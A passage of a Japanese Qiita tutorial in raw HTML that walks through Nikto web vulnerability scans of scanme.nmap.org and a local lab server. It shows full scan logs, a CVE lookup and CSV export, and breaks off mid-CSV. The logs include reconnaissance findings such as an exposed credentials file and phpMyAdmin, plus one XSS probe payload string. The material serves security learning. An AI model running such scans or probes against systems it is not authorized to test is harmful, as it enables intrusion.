href=\"#one-nikto%E3%81%AE%E8%B5%B7%E5%8B%95%E3%81%A8%E3%83%86%E3%82%B9%E3%83%88%E3%82%B5%E3%82%A4%E3%83%88%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\"><i class=\"fa fa-link\"></i></a><img alt=\":one:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/31-fe0f-20e3.png\" title=\":one:\" width=\"20\" loading=\"lazy\"> Niktoの起動とテストサイトのスキャン</h3>\n<p data-sourcepos=\"134:1-135:63\">アプリメニューまたはコマンドラインからNiktoを起動しNmap公開テストサイトに対してスキャンを実行します。<br>\n※全件完了には時間を要すため中断してます。</p>\n<p data-sourcepos=\"137:1-138:122\">Nmap公開テストサイト（scanme.nmap.org）のスクリーンショット<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2F3621db1d-6687-468a-bb93-168df2cd7962.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=8482f30edd0a20f994bf59045d3bb7fc\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2F3621db1d-6687-468a-bb93-168df2cd7962.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=8482f30edd0a20f994bf59045d3bb7fc\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2F3621db1d-6687-468a-bb93-168df2cd7962.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=5641d73c3f15004cd5d5c72cffbccfe1 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/3621db1d-6687-468a-bb93-168df2cd7962.png\" loading=\"lazy\"></a></p>\n<div class=\"code-frame\" data-lang=\"shell-session\" data-sourcepos=\"141:1-161:3\"><div class=\"highlight\"><pre><code><span class=\"go\">┌──(kali㉿Kali)-[~]\n</span><span class=\"gp\">└─$</span><span class=\"w\"> </span>nikto <span class=\"nt\">-h</span> scanme.nmap.org\n<span class=\"go\">- Nikto v2.5.0\n---------------------------------------------------------------------------\n+ Multiple IPs found: 45.33.32.156, 2600:3c01::f03c:91ff:fe18:bb2f\n+ Target IP:          45.33.32.156\n+ Target Hostname:    scanme.nmap.org\n+ Target Port:        80\n+ Start Time:         2025-11-08 12:13:25 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.4.7 (Ubuntu)\n+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\n+ No CGI Directories found (use '-C all' to force check all possible dirs)\n+ /index: Uncommon header 'tcn' found, with contents: list.\n+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275\n+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.\n+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .\n^C\n</span></code></pre></div></div>\n<p data-sourcepos=\"163:1-165:160\">検出された脆弱性を一つ取り上げると、「X-Content-Type-Optionsヘッダー未設定」と確認できる。<br>\nブラウザがMIMEタイプを誤認し悪用されるリスクがある脆弱性です。<br>\n対策としてContent-Typeを適切に設定するか、「X-Content-Type-Options: nosniff」とスニッフィングを無効化する方法があります。</p>\n<h3 data-sourcepos=\"167:1-167:49\">\n<span id=\"two-複数サーバーの一括スキャン\" class=\"fragment\"></span><a href=\"#two-%E8%A4%87%E6%95%B0%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E3%81%AE%E4%B8%80%E6%8B%AC%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\"><i class=\"fa fa-link\"></i></a><img alt=\":two:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/32-fe0f-20e3.png\" title=\":two:\" width=\"20\" loading=\"lazy\"> 複数サーバーの一括スキャン</h3>\n<p data-sourcepos=\"168:1-169:229\">ローカル環境の仮想ネットワーク上の複数ホストを一括でスキャンします。<br>\n複数ホストを一括スキャンする際には、対象をリスト化したテキストファイルを用意（DNS Lookupなどを活用）し'-h'オプションでNiktoに渡すことで一括スキャンが可能です。</p>\n<p data-sourcepos=\"171:1-172:122\">ログが膨大であるためスクリーンショットで代用してます。<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fbe1a606e-55b8-44a6-8273-c4d9b41e9bc4.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=892b7edd393d31f9849386e3fbda6230\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fbe1a606e-55b8-44a6-8273-c4d9b41e9bc4.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=892b7edd393d31f9849386e3fbda6230\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fbe1a606e-55b8-44a6-8273-c4d9b41e9bc4.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=3ccf8bab0fb7baabfd2ac8ad9161c0f3 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/be1a606e-55b8-44a6-8273-c4d9b41e9bc4.png\" loading=\"lazy\"></a></p>\n<h3 data-sourcepos=\"174:1-174:39\">\n<span id=\"three-cveの確認と詳細調査\" class=\"fragment\"></span><a href=\"#three-cve%E3%81%AE%E7%A2%BA%E8%AA%8D%E3%81%A8%E8%A9%B3%E7%B4%B0%E8%AA%BF%E6%9F%BB\"><i class=\"fa fa-link\"></i></a><img alt=\":three:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/33-fe0f-20e3.png\" title=\":three:\" width=\"20\" loading=\"lazy\"> CVEの確認と詳細調査</h3>\n<p data-sourcepos=\"175:1-176:95\">172.17.0.2のローカルWebサーバーをスキャンしたところ、<br>\nCVE-1999-0678とCVE-2003-1418の脆弱性が確認できたためその詳細を確認する。</p>\n<details><summary> 実行時のログはこちら（クリックで展開）</summary>\n<div class=\"code-frame\" data-lang=\"shell-session\" data-sourcepos=\"180:1-218:3\"><div class=\"highlight\"><pre><code><span class=\"go\">---------------------------------------------------------------------------\n+ Target IP:          172.17.0.2\n+ Target Hostname:    172.17.0.2\n+ Target Port:        80\n+ Start Time:         2025-11-08 12:26:51 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.8 (Ubuntu) DAV/2\n+ /: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.\n+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\n+ /index: Uncommon header 'tcn' found, with contents: list.\n+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275\n+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.\n+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.\n+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing\n+ /phpinfo.php: Output from the phpinfo() function was found.\n+ /doc/: Directory indexing found.\n+ /doc/: The /doc/ directory is browsable. This may be /usr/doc. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0678\n+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /phpMyAdmin/ChangeLog: Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 1115138, size: 40540, mtime: Tue Dec  9 17:24:00 2008. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418\n+ /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /test/: Directory indexing found.\n+ /test/: This might be interesting.\n+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552\n+ /icons/: Directory indexing found.\n+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/\n+ /phpMyAdmin/: phpMyAdmin directory found.\n+ /phpMyAdmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /phpMyAdmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. See: https://typo3.org/\n</span><span class=\"gp\">+ /#</span>wp-config.php#: <span class=\"c\">#wp-config.php# file found. This file contains the credentials.</span>\n<span class=\"go\">+ 8917 requests: 0 error(s) and 27 item(s) reported on remote host\n+ End Time:           2025-11-08 12:27:10 (GMT0) (19 seconds)\n\n</span></code></pre></div></div>\n</details>\n<p data-sourcepos=\"222:1-222:64\">NIST NVD（<a href=\"https://nvd.nist.gov/\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">https://nvd.nist.gov/</a>) から詳細を確認すると</p>\n<ul data-sourcepos=\"223:1-227:0\">\n<li data-sourcepos=\"223:1-224:134\">CVE-1999-0678<br>\nApache のデフォルト設定により /usr/doc が公開され、サーバー内部ドキュメントが閲覧可能となる問題</li>\n<li data-sourcepos=\"225:1-227:0\">CVE-2003-1418<br>\nETag に含まれる inode や、multipart MIME 境界の子プロセス ID が漏洩しうる問題</li>\n</ul>\n<p data-sourcepos=\"228:1-228:36\">であることがわかります。</p>\n<p data-sourcepos=\"230:1-231:122\">参考：CVEに関するスクリーンショット<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fd3a91e01-42ea-4597-b234-11c97fc1da12.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=3d3ba4659a660f5648acdea1a37dd40d\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fd3a91e01-42ea-4597-b234-11c97fc1da12.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=3d3ba4659a660f5648acdea1a37dd40d\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fd3a91e01-42ea-4597-b234-11c97fc1da12.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=02c8f4b9f286415d2e5625ec4224f141 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/d3a91e01-42ea-4597-b234-11c97fc1da12.png\" loading=\"lazy\"></a></p>\n<h3 data-sourcepos=\"233:1-233:52\">\n<span id=\"four-niktoの実行結果のエクスポート\" class=\"fragment\"></span><a href=\"#four-nikto%E3%81%AE%E5%AE%9F%E8%A1%8C%E7%B5%90%E6%9E%9C%E3%81%AE%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%9D%E3%83%BC%E3%83%88\"><i class=\"fa fa-link\"></i></a><img alt=\":four:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/34-fe0f-20e3.png\" title=\":four:\" width=\"20\" loading=\"lazy\"> Niktoの実行結果のエクスポート</h3>\n<p data-sourcepos=\"234:1-235:70\">Niktoはスキャン結果を HTML / CSV / TXT 形式で出力可能です。<br>\nhtml と csv 形式で出力する方法をそれぞれ示します。</p>\n<ul data-sourcepos=\"236:1-237:0\">\n<li data-sourcepos=\"236:1-237:0\">html</li>\n</ul>\n<p data-sourcepos=\"238:1-238:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fa1ab2f15-eb8e-420f-aa52-e289e166d84c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ab49e5b521d1f997485d3c0821aa5517\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fa1ab2f15-eb8e-420f-aa52-e289e166d84c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ab49e5b521d1f997485d3c0821aa5517\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fa1ab2f15-eb8e-420f-aa52-e289e166d84c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=28ae5d3da8af3aa98d2cb4afb7c50a41 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/a1ab2f15-eb8e-420f-aa52-e289e166d84c.png\" loading=\"lazy\"></a></p>\n<details><summary>実行時のログはこちら（クリックで展開）</summary>\n<div class=\"code-frame\" data-lang=\"shell-session\" data-sourcepos=\"242:1-284:3\"><div class=\"highlight\"><pre><code><span class=\"go\">┌──(kali㉿Kali)-[~]\n</span><span class=\"gp\">└─$</span><span class=\"w\"> </span>nikto <span class=\"nt\">-h</span> 172.17.0.2 <span class=\"nt\">-o</span> scan_results.htm\n<span class=\"go\">- Nikto v2.5.0\n---------------------------------------------------------------------------\n+ Target IP:          172.17.0.2\n+ Target Hostname:    172.17.0.2\n+ Target Port:        80\n+ Start Time:         2025-11-08 12:42:36 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.8 (Ubuntu) DAV/2\n+ /: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.\n+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\n+ /index: Uncommon header 'tcn' found, with contents: list.\n+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275\n+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.\n+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.\n+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing\n+ /phpinfo.php: Output from the phpinfo() function was found.\n+ /doc/: Directory indexing found.\n+ /doc/: The /doc/ directory is browsable. This may be /usr/doc. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0678\n+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /phpMyAdmin/ChangeLog: Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 1115138, size: 40540, mtime: Tue Dec  9 17:24:00 2008. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418\n+ /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /test/: Directory indexing found.\n+ /test/: This might be interesting.\n+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552\n+ /icons/: Directory indexing found.\n+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/\n+ /phpMyAdmin/: phpMyAdmin directory found.\n+ /phpMyAdmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /phpMyAdmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. See: https://typo3.org/\n</span><span class=\"gp\">+ /#</span>wp-config.php#: <span class=\"c\">#wp-config.php# file found. This file contains the credentials.</span>\n<span class=\"go\">+ 8910 requests: 0 error(s) and 27 item(s) reported on remote host\n+ End Time:           2025-11-08 12:42:54 (GMT0) (18 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested\n</span></code></pre></div></div>\n</details>\n<ul data-sourcepos=\"288:1-289:0\">\n<li data-sourcepos=\"288:1-289:0\">csv</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"290:1-322:3\"><div class=\"highlight\"><pre><code>┌──<span class=\"o\">(</span>kali㉿Kali<span class=\"o\">)</span>-[~]\n└─<span class=\"nv\">$ </span><span class=\"nb\">cat </span>scan_results.txt                                                                                                                       \n<span class=\"s2\">\"Nikto - v2.5.0/\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"Apache/2.2.8 (Ubuntu) DAV/2\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/\"</span>,<span class=\"s2\">\"Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/\"</span>,<span class=\"s2\">\"The anti-clickjacking X-Frame-Options header is not present.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/\"</span>,<span class=\"s2\">\"The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/index\"</span>,<span class=\"s2\">\"Uncommon header 'tcn' found, with contents: list.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/index\"</span>,<span class=\"s2\">\"Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"HEAD\"</span>,<span class=\"s2\">\"/\"</span>,<span class=\"s2\">\"Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"ARPIYMWU\"</span>,<span class=\"s2\">\"/\"</span>,<span class=\"s2\">\"Web Server returns a valid response with junk HTTP methods which may cause false positives.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"https://owasp.org/www-community/attacks/Cross_Site_Tracing\"</span>,<span class=\"s2\">\"TRACE\"</span>,<span class=\"s2\">\"/\"</span>,<span class=\"s2\">\"HTTP TRACE method is active which suggests the host is vulnerable to XST.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/phpinfo.php?VARIABLE=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"</span>,<span class=\"s2\">\"/phpinfo.php: Output from the phpinfo() function was found.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/doc/\"</span>,<span class=\"s2\">\"Directory indexing found.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"CVE-1999-0678\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/doc/\"</span>,<span class=\"s2\">\"The /doc/ directory is browsable. This may be /usr/doc.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"OSVDB-12184\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000\"</span>,<span class=\"s2\">\"PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"OSVDB-12184\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42\"</span>,<span class=\"s2\">\"PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"OSVDB-12184\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42\"</span>,<span class=\"s2\">\"PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"OSVDB-12184\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/?=PHPE9568F35-D428-11d2-A769-00AA001ACF42\"</span>,<span class=\"s2\">\"PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/phpMyAdmin/changelog.php\"</span>,<span class=\"s2\">\"phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"CVE-2003-1418\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/phpMyAdmin/ChangeLog\"</span>,<span class=\"s2\">\"Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 1115138, size: 40540, mtime: Tue Dec  9 17:24:00 2008.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/phpMyAdmin/ChangeLog\"</span>,<span class=\"s2\">\"phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/test/\"</span>,<span class=\"s2\">\"Directory indexing found.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/test/\"</span>,<span class=\"s2\">\"This might be interesting.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"CWE-552\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/phpinfo.php\"</span>,<span class=\"s2\">\"PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/icons/\"</span>,<span class=\"s2\">\"Directory indexing found.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/icons/README\"</span>,<span class=\"s2\">\"Apache default file found.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/phpMyAdmin/\"</span>,<span class=\"s2\">\"phpMyAdmin directory found.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/phpMyAdmin/Documentation.html\"</span>,<span class=\"s2\">\"phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span 